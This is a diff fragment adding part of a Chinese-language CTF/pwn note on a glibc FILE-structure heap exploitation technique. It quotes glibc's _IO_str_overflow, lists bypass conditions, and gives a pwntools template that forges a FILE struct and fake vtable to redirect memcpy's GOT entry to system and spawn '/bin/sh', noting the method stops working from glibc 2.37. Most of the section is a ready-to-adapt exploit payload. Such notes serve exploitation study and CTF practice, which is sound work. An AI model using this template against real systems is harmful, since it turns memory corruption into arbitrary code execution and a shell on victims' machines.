+          /* Make sure _IO_setb won't try to delete _IO_buf_base. */
+          fp->_IO_buf_base = NULL;
+        }
+      memset (new_buf + old_blen, '\0', new_size - old_blen);
+  
+      _IO_setb (fp, new_buf, new_buf + new_size, 1);
+      fp->_IO_read_base = new_buf + (fp->_IO_read_base - old_buf);
+      fp->_IO_read_ptr = new_buf + (fp->_IO_read_ptr - old_buf);
+      fp->_IO_read_end = new_buf + (fp->_IO_read_end - old_buf);
+      fp->_IO_write_ptr = new_buf + (fp->_IO_write_ptr - old_buf);
+  
+      fp->_IO_write_base = new_buf;
+      fp->_IO_write_end = fp->_IO_buf_end;
+    }
+    }
+  
+  if (!flush_only)
+      // 此处 fp->_IO_write_ptr 自加1，所以之前要少1.
+    *fp->_IO_write_ptr++ = (unsigned char) c;
+  if (fp->_IO_write_ptr > fp->_IO_read_end)
+    fp->_IO_read_end = fp->_IO_write_ptr;
+  return c;
+}
+libc_hidden_def (_IO_str_overflow)
+```
+
+**绕过**
+
+- `_flags = 0x400` 。
+- `fp->_IO_read_ptr` 为再次执行 `__mempcpy (f->_IO_write_ptr, s, count);` 的 `rdi - 1` 。
+- `(fp)->_IO_buf_end - (fp)->_IO_buf_base` 要足够大，一般设置 `(fp)->_IO_buf_end = 0xFFFFFFFFFFFFFFF0` 即可
+
+**利用**
+
+![house-of-cmwl](/img/pwn_note.zh-cn.assets/60649d737092dba6af8cb8c9977061aa.png)
+
+**模板**
+
+```c
+file_addr = heap_base + 0x6d0
+payload_addr = file_addr + 0x10
+wide_data_addr = file_addr + 0xe0
+memcpy_buf_addr = file_addr + 0x1c8 + 8 * 3
+memcpy_got_addr = libc.address + 0x1d1040
+ 
+fake_file = b""
+fake_file += p64(1)  # _IO_read_end
+fake_file += p64(0)  # _IO_read_base
+fake_file += p64(0)  # _IO_write_base
+fake_file += p64(1)  # _IO_write_ptr
+fake_file += p64(0x400)  # _IO_write_end
+fake_file += p64(memcpy_buf_addr + 8 - 1)  # _IO_buf_base;
+fake_file += p64(0)  # _IO_buf_end
+fake_file += p64(0)  # _IO_save_base
+fake_file += p64(0)  # _IO_backup_base
+fake_file += p64(memcpy_got_addr)  # _IO_save_end
+fake_file += p64(memcpy_got_addr + 21)  # _marks
+fake_file += p64(0)  # the FILE chain ptr
+fake_file += p64(0xFFFFFFFFFFFFFFF0)  # _fileno + _flags2
+fake_file += p64(0)  # _old_offset, -1
+fake_file += p16(0)  # _cur_column
+fake_file += b"\x00"  # _vtable_offset
+fake_file += b"\n"  # _shortbuf[1]
+fake_file += p32(0)  # padding
+fake_file += p64(libc.sym['_IO_2_1_stdout_'] + 0x1ea0)  # _IO_stdfile_1_lock
+fake_file += p64(0xFFFFFFFFFFFFFFFF)  # _offset, -1
+fake_file += p64(0)  # _codecvt, usually 0
+fake_file += p64(wide_data_addr)  # _IO_wide_data_1
+fake_file += p64(0)  # _freeres_list
+fake_file += p64(0)  # _freeres_buf
+fake_file += p64(libc.sym['_IO_2_1_stdout_'] + 0x1ea0)  # __pad5
+fake_file += p32(0xFFFFFFFF)  # _mode, usually -1
+fake_file += b"\x00" * 19  # _unused2
+fake_file = fake_file.ljust(0xD8 - 0x10, b'\x00')  # adjust to vtable
+fake_file += p64(libc.sym['_IO_helper_jumps'])  # fake vtable
+fake_file += p64(0) * 3
+fake_file += p64(memcpy_buf_addr)
+fake_file += p64(memcpy_buf_addr + (21 * 2 + 1) * 4)
+fake_file += p64(libc.sym['_IO_str_jumps'])
+fake_file = fake_file.ljust(0x1c8 - 0x10, '\x00')
+fake_file += p64(file_addr + 0x30)
+fake_file += p64(0) * 2
+fake_file += p64(libc.sym['system'])
+fake_file += '/bin/sh\x00'
+```
+
+glibc-2.37 开始删除了 `_IO_helper_jumps` ，方法失效
 
 ## 条件竞争
 
